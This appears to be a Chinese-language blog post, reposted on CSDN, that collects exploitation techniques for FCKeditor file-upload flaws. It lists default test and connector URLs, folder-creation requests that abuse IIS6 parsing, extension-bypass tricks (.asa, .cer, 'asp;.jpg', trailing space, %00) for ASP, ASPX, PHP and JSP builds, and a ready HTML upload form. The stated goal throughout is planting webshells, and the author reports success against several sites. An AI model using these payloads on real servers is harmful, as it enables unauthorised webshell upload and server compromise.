**目录**

[FCKeditor](#t0 "FCKeditor")

[asp网页](#t1 "asp网页")

[aspx网页](#t2 "aspx网页")

[php网页](#t3 "php网页")

[jsp网页](#t4 "jsp网页 ") 

* * *

FCKeditor
---------

FCKeditor是一个功能强大支持所见即所得功能的文本编辑器，可以为用户提供微软office软件一样的在线文档编辑服务。它不需要安装任何形式的客户端，兼容绝大多数主流浏览器，支持ASP.Net、ASP、ColdFusion 、PHP、Java、Active-FoxPro、Lasso、Perl、python 等编程环境。

**查看编辑器版本：**

```
/fckeditor/editor/dialog/fck_about.html      
/FCKeditor/_whatsnew.html
```


![](https://img-blog.csdnimg.cn/20190423090809911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190423090725259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**一些FCK默认链接(以asp为例)：**

```
上传测试页面：Fckeditor编辑器默认会存在test.html和uploadtest.html文件，直接访问这些文件可以获取当前文件夹文件名称以及上传文件，有的版本可以直接上传任意文件类型，测试上传地址有：      
FCKeditor/editor/filemanager/browser/default/connectors/test.html      
FCKeditor/editor/filemanager/upload/test.html      
FCKeditor/editor/filemanager/connectors/test.html      
FCKeditor/editor/filemanager/connectors/uploadtest.html       
示例页面：      
FCKeditor/_samples/default.html      
FCKeditor/_samples/asp/sample01.asp      1
FCKeditor/_samples/asp/sample02.asp      1
FCKeditor/_samples/asp/sample03.asp      1
FCKeditor/_samples/asp/sample04.asp       1
连接器：      1
FCKeditor/editor/filemanager/connectors/asp/connector.asp      1
FCKeditor/editor/filemanager/connectors/aspx/connector.aspx       1
创建文件夹链接：      1
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=test       2
上传页面：      2
Fckeditor/editor/filemanager/browser/default/browser.html?Type=file&Connector=connectors/asp/connector.Asp      2
Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/asp/connector.asp      2
FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.asp      2
FCKeditor/editor/filemanager/browser/default/browser.html?Type=/&Connector=connectors/asp/connector.asp      2
FCKeditor/editor/filemanager/browser/default/browser.html?Type=monyer&Connector=connectors/asp/connector.asp       2
有时候，网站管理员会把上传页面禁止创建文件夹和上传文件，但是由于网站管理员的配置不当，我们的连接器写绝对路径的话，有时候可以创建文件夹和上传文件      2
Fckeditor/editor/filemanager/browser/default/browser.html?Type=file&Connector=http://ww.xxx.com/connectors/asp/connector.Asp      3
Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://ww.xxx.com/connectors/asp/connector.asp      3
Fckeditor/editor/filemanager/browser/default/browser.html?Type=Flash&Connector=http://ww.xxx.com/connectors/asp/connector.asp
```


![](https://img-blog.csdnimg.cn/20190423095508776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190423095546778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190423100913404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190423101016952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190423101123893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**FCKeditor 文件上传“.”变“\_”下划线的绕过方法**

很多时候上传的文件例如： 或shell.asp;.jpg 会变为shell\_asp;.jpg 这是新版FCK 的变化。

*   继续上传同名文件可变为shell.php;(1).jpg ，但是新版Fckeditor也修复了这个漏洞。

如果服务器有解析漏洞的话，可以创建文件夹来突破

```
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/xx.asp&NewFolderName=x.asp
```


### asp网页

asp一般是搭在Windows Server主机上，Web Server版本一般为 IIS6 / IIS7 / IIS7.5。据我现在所知，asp版的fckeditor已经可以全秒了。

< 2.4.x 版本的File参数时为黑名单验证，可以通过上传.asa、.cer、.asp;jpg（针对IIS6）。如果asa、cer不被解析，还可以传.asp\[空格\]。传的方法就是抓包然后在数据包里的文件名后填个空格。

对于 2.5.x 和 2.6.x  版本，如果是IIS6.0 ，可以通过突破变”.”为”\_”限制创建.asp文件夹，代码如下：

```
Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp
```


复制代码然后往这个文件夹里传 jpg ，这个不多说了。

如果是IIS7及以上，这种方法就gg了。这个时候可以借助刚爆出来的那种方法，先传shell.asp%00txt，然后再传一次。

至此，asp版本已经全秒了。

### aspx网页

低版本同ASP版，2.6.x用刚爆出来的二次上传已经不好使了，不过新建test.asp的文件夹还可以使。一般IIS6.0会支持asp，可以先传个asp上去，然后再XX。

### php网页

1：低版本（2.4.x及以下），仍然为黑名单验证，windows主机可以使用php\[空格\]传，2.4.3的有个media未设置导致任意文件上传可以秒linux。

2：2.5.x以后是白名单验证，仅能寄希望于wooyun里爆的那个<2.6.4的任意文件上传，成功率有限。

3：2.6.4以上的php版，据我所知没戏，求高人指点！我粗略的看了一下它的验证逻辑，表示没戏，windows里的敏感字符全给过滤了。

4：当FCKeditor 版本 <=2.4.2的php网页在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址为存在漏洞网页的链接。

```
<form id="frmUpload" enctype="multipart/form-data"      
action="http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post">Upload a new file:<br>      
<input type="file" name="NewFile" size="50"><br>      
<input id="btnUpload" type="submit" value="Upload">      
</form>
```


### jsp网页 

```
http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=%2F
```


**上传马所在目录**

```
FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
```


**上传shell的地址**

```
http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector
```


跟版本有关系.并不是百分百成功. 测试成功几个站.  
不能通杀.很遗憾.

```
http://www.****.com/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector
```


如果以上地址不行可以试试

```
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/servlet/Connector      
FCKeditor/_samples/      
FCKeditor/_samples/default.html      
FCKeditor/editor/fckeditor.htm      
FCKeditor/editor/fckdialog.html
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

转载文章：[FCKeditor上传漏洞总结\_龙哥盟-CSDN博客\_fckeditor 上传漏洞](https://blog.csdn.net/wizardforcel/article/details/50695885 "FCKeditor上传漏洞总结_龙哥盟-CSDN博客_fckeditor 上传漏洞")

                 [Fckeditor常见漏洞的挖掘与利用整理汇总\_lizhengnanhua的专栏-CSDN博客](https://blog.csdn.net/lizhengnanhua/article/details/38451737 "Fckeditor常见漏洞的挖掘与利用整理汇总_lizhengnanhua的专栏-CSDN博客")